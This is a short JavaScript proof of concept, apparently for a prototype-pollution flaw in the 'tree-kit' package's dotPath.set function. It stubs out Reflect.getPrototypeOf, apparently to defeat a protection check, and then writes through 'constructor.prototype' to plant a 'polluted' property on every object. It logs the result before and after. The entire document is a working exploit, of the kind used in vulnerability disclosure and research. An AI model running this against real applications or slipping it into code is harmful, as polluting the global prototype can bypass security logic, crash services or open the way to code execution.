Reflect.getPrototypeOf = () => false;
const {dotPath} = require('tree-kit');
obj = {};
console.log({}.polluted);
dotPath.set({}, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);